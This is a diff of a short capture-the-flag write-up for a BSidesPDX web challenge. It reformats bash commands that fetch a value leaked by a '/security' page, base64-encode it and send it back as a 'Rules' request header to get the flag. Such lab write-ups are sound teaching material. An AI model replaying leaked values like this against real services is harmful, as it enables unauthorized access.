@@ -25,10 +25,11 @@ The security page is leaking a value.
 
 If we take what we did for the rules page and follow the same process of taking the leaked value base64 encoded it and submitt it we should get the flag. 
 
-Now if we do
-header=$(curl heading-the-right-way.bsidespdxctf.party:8081/security | base64)
-headernospace="$(echo -e "${header}" | tr -d '[:space:]')"
-curl localhost:8081/security -H "Rules: $headernospace" 
+Now if we do on a bash command line
+
+`header=$(curl heading-the-right-way.bsidespdxctf.party:8081/security | base64)`
+`headernospace="$(echo -e "${header}" | tr -d '[:space:]')"`
+`curl localhost:8081/security -H "Rules: $headernospace"`
 
 we will get the flag :)
 
